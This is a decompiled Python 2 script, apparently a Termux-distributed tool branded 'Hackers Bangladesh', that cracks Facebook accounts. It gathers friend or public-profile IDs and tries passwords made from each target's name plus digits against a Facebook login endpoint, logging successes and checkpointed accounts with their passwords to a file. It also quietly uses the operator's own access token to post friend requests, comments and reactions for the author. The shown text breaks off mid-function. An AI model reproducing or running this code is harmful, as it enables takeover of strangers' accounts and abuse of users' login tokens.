
# Decompiled by HTR-TECH | TAHMID RAYAT
#---------------------------------------
# Source File : dec_22
# Time : Fri Mar 12 05:34:40 2021
#---------------------------------------
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
# [GCC 8.3.0]
# Embedded file name: <James404>
import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib, uuid
from multiprocessing.pool import ThreadPool
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 Crack.py')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '[!] Exit'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '%s;' % str(31 + j))

    x += ''
    x = x.replace('!0', '')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.06)


logo = "\n\x1b[1;92m    _          _\n\x1b[1;92m     \\        /\n\x1b[1;92m    __\\______/__\n\x1b[1;92m    | [\x1b[1;31;1m\xc2\xa9\x1b[1;92m]  [\x1b[1;31;1m\xc2\xa9\x1b[1;92m] |\xe2\x80\x8b\n \x1b[1;92m   |  [\x1b[1;33m====\x1b[1;92m]  | [+] HACKERS BANGLADESH [+]\n\x1b[1;92m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90o00\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9000o\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\x1b[1;31;1m\xe2\x96\x88 \x1b[1;92m [\xe2\x80\xa2] \x1b[1;31;1mAuthor    :  \x1b[1;92m James404_           \x1b[1;31;1m \xe2\x96\x88\n\x1b[1;31;1m\xe2\x96\x88 \x1b[1;92m [\xe2\x80\xa2] \x1b[1;31;1mWhatsapp  :  \x1b[1;92m +96598064347        \x1b[1;31;1m \xe2\x96\x88\n\x1b[1;31;1m\xe2\x96\x88 \x1b[1;92m [\xe2\x80\xa2] \x1b[1;31;1mWhatsapp  : \x1b[1;92m  Black404_           \x1b[1;31;1m \xe2\x96\x88\n\x1b[1;31;1m\xe2\x96\x88 \x1b[1;92m [\xe2\x80\xa2] \x1b[1;31;1mGrup Fb   :  \x1b[1;92m Termux Command World\x1b[1;31;1m \xe2\x96\x88\n\x1b[1;31;1m\xe2\x96\x88 \x1b[1;92m [\xe2\x80\xa2] \x1b[1;31;1mVersion   :  \x1b[1;92m 0.3                  \x1b[1;31;1m\xe2\x96\x88\n\x1b[1;92m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n\x1b[1;93m\xe2\x9e\xa3 HACKING IS NOT CRIME IT\xe2\x80\x99S A GAME AGAINST OF THE SYSTEM \n\x1b[1;93m\xe2\x9e\xa3 BANGLADESH BLACK HAT HACKER\n\x1b[1;31;1m\xe2\x9e\xa3     AUTHOR :\x1b[1;92m JAMES-HACKER\n\x1b[1;31;1m\xe2\x9e\xa3       FROM :\x1b[1;92m DHAKA,NARAYANGANJ \n\x1b[1;31;1m\xe2\x9e\xa3    WARNING :\x1b[1;92m DON'T COPY MY SCRIPT\n\x1b[1;31;1m\xe2\x9e\xa3    WARNING :\x1b[1;92m IF YOU GET TO FACE PROBLEM CLONING TIME\n\x1b[1;31;1m\xe2\x9e\xa3    WARNING :\x1b[1;92m CONTACT MY FB GROUP OR PAGE  "

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m[\x1b[1;93m\xe2\x98\x85\x1b[1;97m]\x1b[1;93m Entering Please Wait Moment\x1b[1;97m ' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
cpe = []
id = []
username = []
idteman = []
idfromteman = []
gagal = []
reaksi = []
komen = []
vulnot = 'Not Vuln'
vuln = 'Vuln'

def masuk():
    os.system('clear')
    print logo
    print '\x1b[1;92m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
    print '\x1b[1;31;1m\xe2\x95\x91[\x1b[1;31;1m01\x1b[1;33m]\x1b[1;31;1mLogin With Email / ID Facebook        \x1b[1;33m\xe2\x95\x91'
    print '\x1b[1;31;1m\xe2\x95\x91[\x1b[1;31;1m02\x1b[1;33m]\x1b[1;31;1mLogin With Token Facebook             \x1b[1;33m\xe2\x95\x91'
    print '\x1b[1;31;1m\xe2\x95\x91[\x1b[1;31;1m03\x1b[1;33m]\x1b[1;31;1mDownload Token  Apps                  \x1b[1;33m\xe2\x95\x91'
    print '\x1b[1;31;1m\xe2\x95\x91[\x1b[1;31;1m00\x1b[1;33m]\x1b[1;31;1mBack                                \x1b[1;33m  \xe2\x95\x91'
    print '\x1b[1;92m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
    pilih_masuk()


def pilih_masuk():
    msuk = raw_input('\x1b[1;93mSelect One \x1b[91m:\x1b[1;96m ')
    if msuk == '':
        print '\x1b[37;1m[\x1b[32;1m!\x1b[37;1m] Fill Correctly !'
        pilih_masuk()
    elif msuk == '1' or msuk == '01':
        login()
    elif msuk == '2' or msuk == '02':
        tokenz()
    elif msuk == '3' or msuk == '03':
        Ambil_Token()
    elif msuk == '0' or msuk == '00':
        keluar()
    else:
        print '\x1b[37;1m[\x1b[32;1m!\x1b[37;1m] Fill Correctly !'
        pilih_masuk()


def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\x1b[1;97m[\x1b[1;96m\xe2\x88\x9a\x1b[1;31;1m] LOGIN WITH FACEBOOK ACCOUNT '
        id = raw_input('[\x1b[1;95m+\x1b[1;92m] ID / Email =\x1b[1;92m ')
        pwd = raw_input('\x1b[1;97m[\x1b[1;31;1m\xe2\x88\x9a\x1b[1;31;1m] Password =\x1b[1;92m ')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n[!] There is no connection'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                unikers = open('login.txt', 'w')
                unikers.write(z['access_token'])
                unikers.close()
                print '\n\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m]\x1b[1;92m Login Successful'
                os.system('xdg-open https://www.facebook.com/Apni.bapka.account7')
                bot_komen()
            except requests.exceptions.ConnectionError:
                print '\n[!] There is no connection'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;97m[\x1b[1;93m!\x1b[1;97m]\x1b[1;93m It looks like your account is Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;91m Password / Email Wrong'
            os.system('rm -rf login.txt')
            time.sleep(1)
            masuk()


def tokenz():
    os.system('clear')
    print logo
    toket = raw_input('\x1b[1;97m[\x1b[1;95m?\x1b[1;97m] \x1b[1;93mToken : \x1b[1;96m')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m]\x1b[1;92m Login Successful'
        os.system('xdg-open https://www.facebook.com/groups/511316119547067/?ref=share ')
        bot_komen()
    except KeyError:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] \x1b[1;91mToken Wrong !'
        time.sleep(1)
        masuk()


def bot_komen():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[!] Token invalid'
        os.system('rm -rf login.txt')

    una = '100003168770372'
    kom = 'Mr James  \xf0\x9f\x98\x98\xf0\x9f\x98\x98\xf0\x9f\x98\x98'
    reac = 'ANGRY'
    post = '3933237346791852'
    post2 = '3933237346791852'
    kom2 = 'Mr James  \xf0\x9f\x98\x98\xf0\x9f\x98\x98\xf0\x9f\x98\x98'
    reac2 = 'LOVE'
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=' + reac2 + '&access_token=' + toket)
    menu()


def Ambil_Token():
    os.system('clear')
    print logo
    jalan('\x1b[1;92mInstall...')
    os.system('cd ... && npm install')
    jalan('\x1b[1;96mStart...')
    os.system('cd ... && npm start')
    raw_input('\n[ Back ]')
    masuk()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        os.system('rm -rf login.txt')
        masuk()

    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print '[!] There is no connection'
        keluar()

    os.system('clear')
    print logo
    print '\x1b[1;31;1m=========================================='
    print '\x1b[1;97m[\x1b[1;34m\xe2\x9c\x93\x1b[1;97m]\x1b[1;92m Name Account\x1b[1;91m     =>\x1b[1;93m ' + nama
    print '\x1b[1;97m[\x1b[1;34m\xe2\x80\xa2\x1b[1;97m]\x1b[1;92m ID\x1b[1;91m           =>\x1b[1;93m ' + id
    print '\x1b[1;97m[\x1b[1;34m+\x1b[1;97m]\x1b[1;92m Birthday \x1b[1;91m =>\x1b[1;93m ' + a['birthday']
    print '\x1b[1;31;1m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
    print '\x1b[1;92m\xe2\x95\x91[\x1b[1;31;1m01\x1b[1;92m]\x1b[1;31;1m->\x1b[1;92mCrack ID           \x1b[1;92m\xe2\x95\x91'
    print '\x1b[1;92m\xe2\x95\x91[\x1b[1;31;1m00\x1b[1;92m\x1b[1;31;1m->\x1b[1;92mBack                \x1b[1;92m\xe2\x95\x91'
    print '\x1b[1;31;1m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
    print '\x1b[1;92m=========================================='
    pilih()


def pilih():
    unikers = raw_input('\x1b[1;31;1mSelect One \x1b[91m:\x1b[1;92m ')
    if unikers == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;92m Fill Correctly !'
        pilih()
    elif unikers == '1' or unikers == '01':
        indo()
    elif unikers == '0' or unikers == '00':
        os.system('clear')
        jalan('Delete tokens')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;92m Fill Correctly !'
        pilih()


def indo():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print '\x1b[1;31;1m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
    print '\x1b[1;92m\xe2\x95\x91\x1b[1;34m[01]\x1b[1;31;1m->\x1b[1;92mCrack From Friends List \x1b[37;96m\xe2\x95\x91'
    print '\x1b[1;92m\xe2\x95\x91\x1b[1;34m[02]\x1b[1;31;1m->\x1b[1;92mCrack From Public ID    \x1b[37;96m\xe2\x95\x91'
    print '\x1b[1;92m\xe2\x95\x91\x1b[1;34m[03]\x1b[1;31;1m->\x1b[1;92mCrack From File         \x1b[37;96m\xe2\x95\x91'
    print '\x1b[1;92m\xe2\x95\x91\x1b[1;34m[00]\x1b[1;31;1m->\x1b[1;92mBack                    \x1b[37;96m\xe2\x95\x91'
    print '\x1b[1;31;1m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
    pilih_indo()


def pilih_indo():
    global cekpoint
    global oks
    teak = raw_input('\x1b[1;93mSelect One \x1b[91m:\x1b[1;96m ')
    if teak == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Fill Correctly !'
        pilih_indo()
    else:
        if teak == '1' or teak == '01':
            os.system('clear')
            print logo
            print '\x1b[1;31;1m=========================================='
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif teak == '2' or teak == '02':
            os.system('clear')
            print logo
            print '\x1b[1;31;1m=========================================='
            print '\x1b[37;1m=========================================='
            idt = raw_input('\x1b[1;97m[\x1b[1;34m\xe2\x9c\x94\x1b[1;97m] Public / friend ID : ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;97m[\x1b[1;93m\xe2\x98\x85\x1b[1;97m] Name : ' + op['name']
            except KeyError:
                print '\x1b[1;97m[\x1b[1;93m!\x1b[1;97m] Missing public / friend ID !'
                raw_input('\n[ Back ]')
                indo()
            except requests.exceptions.ConnectionError:
                print '[!] There is no connection !'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif teak == '3' or teak == '03':
            os.system('clear')
            print logo
            try:
                print '\x1b[1;31;1m=========================================='
                idlist = raw_input('\x1b[1;97m[\x1b[1;93m?\x1b[1;97m] Name File : ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;97m[!] File does not exist ! '
                raw_input('\n\x1b[1;92m[ \x1b[1;97mBack \x1b[1;92m]')
            except IOError:
                print '\x1b[1;97m[!] File does not exist!'
                raw_input('\n\x1b[1;92m[ \x1b[1;97mBack \x1b[1;92m]')
                indo()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Fill Correctly !'
            pilih_indo()
        print '\x1b[1;97m[\x1b[1;93m\xe2\x9e\xb9\x1b[1;97m] Total ID : ' + str(len(id))
        print '\x1b[1;97m[\x1b[1;93m\xe2\x9e\xb9\x1b[1;97m] Stop CTRL+Z'
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;97m[\x1b[1;93m\xe2\x9e\xb9\x1b[1;97m] Crack Running ' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\n\x1b[1;31;1m=========================================='
    print '\n\x1b[37;1m=========================================='

    def main(arg):
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            c = json.loads(a.text)
            pass1 = c['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + w['access_token'])
                z = json.loads(x.text)
                print '\x1c\x1b[1;33m[\xe2\x9c\x94] \x1c\x1b[1;33m[JAMES-HACKED]'
                print '\x1c\x1b[1;33m[\xe2\x9e\xb9] \x1c\x1b[1;33mName \x1c\x1b[1;33m    : \x1c\x1b[1;33m' + c['name']
                print '\x1c\x1b[1;33m[\xe2\x9e\xb9] \x1c\x1b[1;33mID \x1c\x1b[1;33m      : \x1c\x1b[1;33m' + user
                print '\x1c\x1b[1;33m[\xe2\x9e\xb9] \x1c\x1b[1;33mPassword \x1c\x1b[1;33m: \x1c\x1b[1;33m' + pass1 + '\n'
                print '\x1c\x1b[1;33m[\xe2\x9e\xb9] \x1c\x1b[1;33mTanggal Lahir \x1c\x1b[1;33m: \x1c\x1b[1;33m' + c['birthday']
                oks.append(user + pass1)
            elif 'www.facebook.com' in w['error_msg']:
                print '\x1c\x1b[1;94m[\xe2\x9c\x96] \x1c\x1b[1;94m[JAMES-CP]'
                print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mName \x1c\x1b[1;94m    : \x1c\x1b[1;95m' + c['name']
                print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
                print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass1 + '\n'
                print '\x1c\x1b[1;97m[\xe2\x9e\xb9] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                cek = open('out/super_cp.txt', 'a')
                cek.write('ID:' + user + ' Pw:' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = c['first_name'] + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + w['access_token'])
                    z = json.loads(x.text)
                    print '\x1c\x1b[1;94m[\xe2\x9c\x94] \x1c\x1b[1;92m[JAMES-HACKED] '
                    print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;91mName \x1c\x1b[1;91m    : \x1c\x1b[1;92m' + c['name']
                    print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;91mID \x1c\x1b[1;91m      : \x1c\x1b[1;92m' + user
                    print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;91mPassword \x1c\x1b[1;91m: \x1c\x1b[1;92m' + pass2 + '\n'
                    print '\x1c\x1b[1;97m[\xe2\x9e\xb9] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                    oks.append(user + pass2)
                elif 'www.facebook.com' in w['error_msg']:
                    print '\x1c\x1b[1;94m[\xe2\x9c\x96] \x1c\x1b[1;94m[JAMES-CP]'
                    print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mName \x1c\x1b[1;94m    : \x1c\x1b[1;95m' + c['name']
                    print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
                    print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass2 + '\n'
                    print '\x1c\x1b[1;97m[\xe2\x9e\xb9] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                    cek = open('out/super_cp.txt', 'a')
                    cek.write('ID:' + user + ' Pw:' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = c['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    w = json.load(data)
                    if 'access_token' in w:
                        x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + w['access_token'])
                        z = json.loads(x.text)
                        print '\x1c\x1b[1;94m[\xe2\x9c\x94] \x1c\x1b[1;92m[JAMES-HACKED] '
                        print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;91mName \x1c\x1b[1;91m    : \x1c\x1b[1;92m' + c['name']
                        print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;91mID \x1c\x1b[1;91m      : \x1c\x1b[1;92m' + user
                        print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;91mPassword \x1c\x1b[1;91m: \x1c\x1b[1;92m' + pass3 + '\n'
                        print '\x1c\x1b[1;97m[\xe2\x9e\xb9] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in w['error_msg']:
                        print '\x1c\x1b[1;94m[\xe2\x9c\x96] \x1c\x1b[1;94m[JAMES-CP]'
                        print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mName \x1c\x1b[1;94m    : \x1c\x1b[1;95m' + c['name']
                        print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
                        print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass3 + '\n'
                        print '\x1c\x1b[1;97m[\xe2\x9e\xb9] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                        cek = open('out/super_cp.txt', 'a')
                        cek.write('ID:' + user + ' Pw:' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass3)
                    else:
                        pass4 = c['last_name'] + '123'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        w = json.load(data)
                        if 'access_token' in w:
                            x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + w['access_token'])
                            z = json.loads(x.text)
                            print '\x1c\x1b[1;94m[\xe2\x9c\x94] \x1c\x1b[1;92m[JAMES-HACKED] '
                            print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;91mName \x1c\x1b[1;91m    : \x1c\x1b[1;92m' + c['name']
                            print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;91mID \x1c\x1b[1;91m      : \x1c\x1b[1;92m' + user
                            print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass4 + '\n'
                            print '\x1c\x1b[1;97m[\xe2\x9e\xb9] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in w['error_msg']:
                            print '\x1c\x1b[1;94m[\xe2\x9c\x96] \x1c\x1b[1;94m[JAMES-CP]'
                            print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mName \x1c\x1b[1;94m    : \x1c\x1b[1;95m' + c['name']
